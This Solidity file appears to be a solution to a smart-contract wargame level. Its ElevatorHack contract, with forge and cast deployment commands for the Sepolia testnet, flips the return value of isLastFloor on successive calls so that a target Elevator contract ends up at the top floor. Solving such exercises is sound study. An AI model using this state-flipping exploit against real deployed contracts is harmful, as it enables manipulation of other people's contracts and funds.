// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * > forge create src/ElevatorHack.sol:ElevatorHack --rpc-url ${SEPOLIA_RPC_URL}
 *          --account updraft --broadcast
 *          --constructor-args ${ELEVATOR_INSTANCE_ADDRESS}
 *
 * > cast send --rpc-url ${SEPOLIA_RPC_URL} --account updraft ${ELEVATOR_HACK_ADDRESS} "hackElevator(uint256)" 100
 */

interface Elevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorHack {
    address public elevatorAddress;
    address public owner;
    bool lastFloorSwitch;

    constructor(address _elevatorAddress) {
        owner = msg.sender;
        elevatorAddress = _elevatorAddress;
        lastFloorSwitch = true;
    }

    function hackElevator(uint256 floor) external {
        require(msg.sender == owner, "Only the owner can hack the elevator");
        Elevator(elevatorAddress).goTo(floor);
    }

    function isLastFloor(uint256 floor) external returns (bool) {
        floor;
        lastFloorSwitch = !lastFloorSwitch;
        return lastFloorSwitch;
    }
}
